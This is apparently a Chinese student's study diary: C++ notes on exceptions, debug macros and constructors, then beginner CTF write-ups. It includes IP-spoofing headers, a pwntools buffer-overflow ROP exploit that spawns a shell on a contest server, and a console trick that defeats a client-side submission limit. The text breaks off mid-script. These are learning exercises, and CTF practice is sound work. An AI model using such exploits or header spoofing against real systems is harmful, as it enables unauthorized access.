title="try语句块和异常处理"></a>try语句块和异常处理</h3><p><code>throw</code>：引发异常，表示遇到无法处理的问题</p><p><code>try</code>：处理异常，以<code>try</code>开始并以一个或多个<code>catch</code>（异常处理代码）结束,<code>try</code>内声明的变量在块外部和<code>catch</code>语句中无法访问</p><p><code>runtime_error</code>的<code>what</code>成员返回的是初始化一个具体对象时所用的<code>string</code>对象的副本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">catch(runtime_error err)&#123;cout &lt;&lt; err.what();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果一段程序没有<code>try</code>语句块且发生了异常或没有匹配的<code>catch</code>子句，系统会调用<code>terminate</code>标准库函数终止当前程序的执行</p><p>标准库定义了一组用于报告标准库函数遇到的问题的异常类，包含在四个头文件中：</p><ul><li><code>exception</code>：定义了最通用的异常类<code>exception</code>，只报告异常的发生不提供额外信息</li><li><code>stdexcept</code>：定义了几种常用的异常类<ul><li><code>runtime_error</code>：只有在运行时才能检测出的问题</li><li><code>range_error</code>：运行时错误：生成结果超出有意义的值域范围</li><li><code>overflow_error</code>：运行时错误：计算上溢</li><li><code>underflow_error</code>：运行时错误：计算下溢</li><li><code>logic_error</code>：程序逻辑错误</li><li><code>domain_error</code>：逻辑错误：参数对应的结果值不存在</li><li><code>invalid_argument</code>：逻辑错误：无效参数</li><li><code>length_error</code>：逻辑错误：试图创建一个超出该类型最大长度的对象</li><li><code>out_of_range</code>：逻辑错误：使用一个超出有效范围的值</li><li><code>exception</code>：最常见的问题</li></ul></li><li><code>new</code>：定义了<code>bad_alloc</code>异常类型</li><li><code>type_info</code>：定义了<code>bad_cast</code>异常类型</li></ul><p>只能以默认初始化的方式初始化<code>exception、bad_alloc、bad_cast</code>对象，不能提供初始值，其他异常类型应该使用<code>string</code>对象或<code>C</code>风格字符串初始化这些类型的对象，初始值含有错误相关的信息</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">throw std::runtime_error(&quot;Runtime error occurred&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每个标准库异常类都只定义了名为<code>what</code>的成员函数，返回值是<code>C</code>风格字符串（即<code>const char＊</code>），提供关于异常的一些文本信息，如果异常类型有一个字符串初始值，<code>what</code>返回该字符串，其他类型由编译器决定</p><h3 id="调试帮助"><a href="#调试帮助" class="headerlink" title="调试帮助"></a>调试帮助</h3><p><code>assert</code>：一种预处理宏，<code>assert(expr);</code>，用于检查不能发生的条件</p><p><code>__func__</code>：输出当前调试的函数的名字</p><p><code>__FILE__</code>：存放文件名的字符串字面值</p><p><code>__LINE__</code>：存放当前行号的整型字面值</p><p><code>__TIME__</code>：存放文件编译时间的字符串字面值</p><p><code>__DATE__</code>：存放文件编译日期的字符串字面值</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if(word.size() &lt; threshold)cerr &lt;&lt; &quot;Error: &quot; &lt;&lt; __FILE__ &lt;&lt; &quot; : in function &quot; &lt;&lt; __func__ &lt;&lt; &quot; at line &quot; &lt;&lt; __LINE__ &lt;&lt; endl &lt;&lt; &quot; Compiled on &quot; &lt;&lt; __DATE__ &lt;&lt; &quot; at &quot;  &lt;&lt; __TIME__ &lt;&lt; endl &lt;&lt; &quot; Word read was \&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\&quot;:Length too short&quot; &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Error:wdebug.cc : in function main at line 27                   Compiled on Ujl 11 2-12 at 20:50:03                   Word read was &quot;foo&quot;:Length too short<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>控制对象的初始化过程，只要类的对象被创建就会执行构造函数。类可以包括多个构造函数，类似重载函数，不同构造函数必须在参数数量或类型上有区别。构造函数不能声明成<code>const</code></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct Sales_data&#123;Sales_data() &#x3D; default;&#x2F;&#x2F;默认构造函数，const成员必须初始化Sales_data(const std::string &amp;s): bookNo(s) &#123;&#125;    &#x2F;&#x2F;等价于Sales_data(const std::string &amp;s): bookNo(s), unite_sold(0), revenue(0)&#123;&#125;Sales_data(const std::string &amp;s, unsigned n, double p):       bookNo(s), units_sold(n), revenue(p*n)&#123;&#125;    &#x2F;&#x2F;冒号及冒号与花括号之间的是构造函数初始值列表Sales_data(std::istream &amp;);    &#x2F;&#x2F;在类的外部定义构造函数    &#x2F;&#x2F;Sales_data::Sales_data(std::istream &amp;is)&#123;    &#x2F;&#x2F;read(is, *this);    &#x2F;&#x2F;&#125;    &#x2F;&#x2F;Sales_data::Sales_data表示定义Sales_data类成员，名字是Sales_datastd::string isbn() const &#123;return bookNo;&#125;Sales_data&amp; combine(const Sales_data&amp;);double avg_price() const;std::string bookNo;unsigned units_sold &#x3D; 0;double revenue &#x3D; 0.0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h4><p>释放对象使用的资源，并销毁对象的非<code>static</code>数据成员，是类的一个成员函数，名字由波浪号接类名构成</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Foo&#123;public:~Foo();...&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-11"><a href="#8-11" class="headerlink" title="#8.11"></a>#8.11</h2><p>写了道题，看了些<code>c++</code>的异常处理和命名空间，感觉没什么很重要需要记的东西，重在理解吧反正不搞开发（bushi</p><h2 id="8-12"><a href="#8-12" class="headerlink" title="#8.12"></a>#8.12</h2><p>嗯..还在学<code>c++</code>，写了道题，就不记录啦，反正<code>c++</code>就学到这里。明天开始学套接字编程，把编程基础补上，<code>python</code>的基础以后再说。</p><h2 id="8-13"><a href="#8-13" class="headerlink" title="#8.13"></a>#8.13</h2><p>一题写了一天…唉同一个问题反复犯。晚上打开<code>moectf</code>写了俩<code>web</code></p><h3 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h3><p>拿<code>phpstudy</code>搭了个网站拿到<code>flag</code></p><h3 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h3><p> <code>dirsearch</code>扫到<code>robots.txt</code>，提示</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"># Robots.txt file for xdsec.org# only robots can find the entrance of web-tutor<span class="token header"><span class="token header-name keyword">User-agent</span><span class="token punctuation">:</span> <span class="token header-value">*</span></span><span class="token header"><span class="token header-name keyword">Disallow</span><span class="token punctuation">:</span> <span class="token header-value">/webtutorEntry.php</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<code>webtutorEntry.php</code>得到<code>flag</code></p><p>后来发现<code>robots.txt</code>就是用于告诉搜索引擎爬虫哪些页面可以抓取，那题目提示的就很明显了</p><h2 id="8-14"><a href="#8-14" class="headerlink" title="#8.14"></a>#8.14</h2><p>装了<code>ida 9</code>和一些<code>web</code>工具：<code>dirsearch、hackbar、 ProxySwitchyOmega，Wappalyzer</code> ，写了一道题，开始下一个逆向目标，解包了固件，没找到目标文件在哪</p><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h3><ol><li><p>Referer：</p><p>指示一个请求是从哪个页面发起的，参数是一个url</p></li><li><p>User Agent：</p><p>User Agent是一个字符串，用于描述发出HTTP请求的浏览器或客户端类型和版本。</p><p>例如：Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;58.0.3029.110 Safari&#x2F;537.3。</p></li><li><p>Cookies：</p><p>Cookies是服务器发送到客户端浏览器的小型数据片段，用于存储信息，如用户偏好、会话标识等。浏览器会存储这些Cookies，并在随后的请求中自动发送给服务器，以便服务器识别用户并保持状态</p></li><li><p>GET请求</p><p>用途：用于请求服务器发送资源</p><p>数据传输：通过URL传递数据，数据附加在URL后面，形成查询字符串，以访问url?xx&#x3D;xx的形式进行get请求</p><p>缓存：GET请求可以被浏览器缓存,请求的数据会保存在浏览器历史记录中</p><p>安全性：由于数据暴露在URL中，因此GET请求不适合传输敏感信息</p></li><li><p>POST请求</p><p>用途：用于向服务器提交数据进行处理，例如表单提交或上传文件</p><p>数据传输：数据在请求体中发送，不会显示在URL中</p><p>python中用post请求参数是data，post中加get请求用params</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests  url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1:60568'</span>  post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>     <span class="token string">'animateButton'</span><span class="token punctuation">:</span> <span class="token string">'Hit the question setter'</span><span class="token punctuation">,</span>     <span class="token string">'imoau'</span><span class="token punctuation">:</span> <span class="token string">'sb'</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span>  get_params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'xt'</span><span class="token punctuation">:</span> <span class="token string">'大帅b'</span><span class="token punctuation">&#125;</span>  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> params<span class="token operator">=</span>get_params<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bp:提交POST请求, 需要比GET请求多提供几个请求头, 其中最重要的一个是<code>Content-Type: application/x-www-form-urlencoded</code>，<code>post</code>多个参数用<code>&amp;</code>连接，<code>get</code>请求在<code>post</code>后面以<code>/?xx=xx</code>的形式</p></li></ol><p>其他头：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">origin：指示请求从哪个源（origin）发起，参数是url//伪造本地ip<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1 </span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1 </span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1 </span></span><span class="token header"><span class="token header-name keyword">X-Remote-Addr</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1 </span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终请求：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /?xt=%e5%a4%a7%e5%b8%85b  HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:60568</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua</span><span class="token punctuation">:</span> <span class="token header-value">"Chromium";v="119", "Not?A_Brand";v="24"</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span><span class="token header"><span class="token header-name keyword">sec-ch-ua-platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">MoeDedicatedBrowser</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span><span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://www.xidian.edu.cn/</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user=admin</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">48</span></span>imoau=sb&amp;animateButton=Hit the question setter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F; (根目录)：网站的主目录，通常包含首页文件和其他重要文件。&#x2F;assets 或 &#x2F;static：用于存放静态资源，如JavaScript、CSS和图像文件。&#x2F;css：专门存放CSS样式表文件。&#x2F;js：存放JavaScript脚本文件。&#x2F;img 或 &#x2F;images：存放网站使用的图像资源。&#x2F;fonts：如果网站使用自定义字体，这个文件夹用于存放字体文件。&#x2F;uploads：用户上传的文件通常会被保存在这个目录。&#x2F;lib 或 &#x2F;vendor：第三方库或依赖的文件夹，例如jQuery、Bootstrap等。&#x2F;plugins：如果网站使用插件系统，这个文件夹用于存放插件文件。&#x2F;includes 或 &#x2F;inc：包含一些被多个页面或脚本包含的通用代码片段。&#x2F;templates 或 &#x2F;views：如果网站使用模板引擎，这个文件夹存放模板文件。&#x2F;partials：存放模板的片段，可以被模板引擎重用。&#x2F;content 或 &#x2F;data：存放网站的内容文件，如Markdown或HTML文件。&#x2F;admin：后台管理界面的文件夹。&#x2F;cache：用于存放缓存文件，以提高网站性能。&#x2F;logs：存放日志文件，记录网站的运行情况和错误信息。&#x2F;config：存放配置文件，如数据库配置、服务器配置等。&#x2F;bin：存放编译或二进制文件。&#x2F;tests：如果网站包含自动化测试，测试脚本和测试数据会存放在这个文件夹。&#x2F;docs：存放项目文档，如开发文档、用户手册等。&#x2F;backups：存放网站的备份文件。&#x2F;src 或 &#x2F;source：如果网站使用构建工具，源代码会存放在这个文件夹。&#x2F;dist 或 &#x2F;build：存放构建或编译后的文件，这些文件是最终提供给用户访问的。&#x2F;.well-known（或在根目录下）：存放一些协议要求的特殊文件，如&#x2F;.well-known&#x2F;acme-challenge用于HTTPS的Let&#39;s Encrypt证书验证。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">index.html：主页文件，通常作为网站的入口点。当用户访问网站时，默认访问的就是这个文件。404.html：错误页面，当用户请求的页面不存在时，服务器会显示这个页面。robots.txt：用于告诉搜索引擎爬虫哪些页面可以抓取，哪些不可以。sitemap.xml：网站地图，列出了网站中所有页面的URL，帮助搜索引擎更好地索引网站。favicon.ico：网站的图标，通常显示在浏览器的标签页上。CSS文件：层叠样式表（Cascading Style Sheets）文件，用于定义网站的布局和样式。JavaScript文件（如 script.js）：用于实现网站的动态功能和交互效果。图像文件（如 logo.png、banner.jpg）：网站上使用的图像资源，用于增强视觉效果。服务器端脚本（如 index.php、config.py）：用于生成动态内容，处理表单提交等。数据库文件（如 database.sql 或通过数据库管理系统存储）：存储网站的数据，如用户信息、文章内容等配置文件（如 config.php、settings.ini）：包含网站的配置信息，如数据库连接信息、服务器设置等。资源文件夹（如 &#x2F;images、&#x2F;css、&#x2F;js）：用于存放静态资源文件，如图片、样式表、脚本等内容管理系统（CMS）文件（如果使用CMS）：如果网站使用CMS，如WordPress、Joomla等，会包含CMS的核心文件和插件。插件&#x2F;扩展文件：如果网站使用了插件或扩展，这些文件会提供额外的功能。临时文件&#x2F;缓存（如 .tmp、.cache）：用于存储临时数据或缓存，提高网站性能。备份文件：网站的备份，用于数据恢复。文档和说明文件（如 README.md、LICENSE）：提供关于网站的说明和使用协议。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-15"><a href="#8-15" class="headerlink" title="#8.15"></a>#8.15</h2><p>感冒发烧，一下吃了四五种药，晕死，写了几题又睡了半天唉</p><p>写了个<code>base</code>的<code>pwn</code>然后写了俩<code>base</code>的<code>web</code>和一个<code>moe</code>的<code>web</code>，整理了一下<code>web</code>的笔记，笔记就不放了，都是些入门的</p><p>好饿啊，吃了点东西全吐了，谁能莫名其妙给我点个<code>KFC</code>（bushi</p><p>emmmm放没结束的比赛的<code>exp</code>会不会不太好，但应该没什么人看我博客吧（（（</p><h3 id="我把它弄丢了"><a href="#我把它弄丢了" class="headerlink" title="我把它弄丢了"></a>我把它弄丢了</h3><p>有<code>binsh</code>有<code>system</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.basectf.fun'</span><span class="token punctuation">,</span> <span class="token number">47078</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>binsh <span class="token operator">=</span> <span class="token number">0x402008</span> shell <span class="token operator">=</span> <span class="token number">0x40120F</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401196</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'her.'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>直接查看源代码，注释里有<code>flag</code>(讲个笑话，还真玩了两分钟的游戏</p><h3 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h3><p>谁懂，因为觉得开<code>bp</code>好麻烦，拿<code>hackbar</code>看了半天不会写</p><p><code>bp</code>抓包改<code>http</code>参数</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /?basectf=we1c%2500me  HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:33834</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span><span class="token header-value">c00k13=i can't eat it</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">9</span></span>Base=fl@g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会得到以下内容，<code>base64</code>解码即可</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Aug 2024 07:05:41 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.4.27</span></span><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>客户端重定向</strong>：</p><ul><li>服务器在响应中返回一个带有302状态码的响应头，指示浏览器进行跳转。</li><li>例如，服务器端脚本通过<code>header(&quot;Location: success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==&quot;);</code>指令将HTTP响应状态设置为302，然后浏览器会自动访问<code>success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</code>页面。</li></ul><h3 id="http响应状态码"><a href="#http响应状态码" class="headerlink" title="http响应状态码"></a>http响应状态码</h3><h4 id="1xx-信息响应"><a href="#1xx-信息响应" class="headerlink" title="1xx: 信息响应"></a>1xx: 信息响应</h4><p>这些状态码表示请求已被接收，服务器正在处理请求。</p><ul><li><strong>100 Continue</strong>: 客户端应继续其请求。</li><li><strong>101 Switching Protocols</strong>: 服务器根据客户端的请求切换协议。</li></ul><h4 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx: 成功"></a>2xx: 成功</h4><p>这些状态码表示请求已成功接收、理解并处理。</p><ul><li><strong>200 OK</strong>: 请求成功，服务器返回请求的资源。</li><li><strong>201 Created</strong>: 请求成功并导致了资源的创建。</li><li><strong>204 No Content</strong>: 请求成功，但服务器没有返回任何内容。</li></ul><h4 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx: 重定向"></a>3xx: 重定向</h4><p>这些状态码表示需要客户端采取进一步的操作以完成请求，通常是用于重定向。</p><ul><li><strong>301 Moved Permanently</strong>: 请求的资源已永久移动到新位置，客户端应使用新URL。</li><li><strong>302 Found</strong>: 请求的资源临时移动到新位置，客户端应继续使用原来的URL。</li><li><strong>304 Not Modified</strong>: 客户端有缓存资源，且资源未被修改，可以继续使用。</li></ul><h4 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx: 客户端错误"></a>4xx: 客户端错误</h4><p>这些状态码表示客户端看起来有问题，导致服务器无法处理请求。</p><ul><li><strong>400 Bad Request</strong>: 请求有错误，服务器无法理解。</li><li><strong>401 Unauthorized</strong>: 请求需要身份验证，客户端未提供有效凭证。</li><li><strong>403 Forbidden</strong>: 服务器理解请求，但拒绝执行。</li><li><strong>404 Not Found</strong>: 服务器无法找到请求的资源。</li><li><strong>405 Method Not Allowed</strong>: 请求的方法不被允许。</li></ul><h4 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx: 服务器错误"></a>5xx: 服务器错误</h4><p>这些状态码表示服务器未能完成有效请求，通常是服务器端的问题。</p><ul><li><strong>500 Internal Server Error</strong>: 服务器遇到错误，无法完成请求。</li><li><strong>502 Bad Gateway</strong>: 服务器作为网关或代理，从上游服务器收到无效响应。</li><li><strong>503 Service Unavailable</strong>: 服务器当前无法处理请求，通常是由于过载或维护。</li><li><strong>504 Gateway Timeout</strong>: 服务器作为网关或代理，未能及时从上游服务器获取响应。</li></ul><h3 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h3><p>要在表白墙提交300次，限制不能重复提交</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>getItem<span class="token punctuation">(</span><span class="token string">'confessionSubmitted'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                alert<span class="token punctuation">(</span><span class="token string">'您已经提交过表白，不能重复提交。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在控制台输入<code>localStorage.removeItem(&#39;confessionSubmitted&#39;);</code>之后即可重复提交，且在控制台就可以通过<code>document.querySelector(&#39;input[type=&quot;submit&quot;]&#39;).click();</code>提交，所以直接写个循环去提交</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">const intervalId <span class="token operator">=</span> setInterval<span class="token 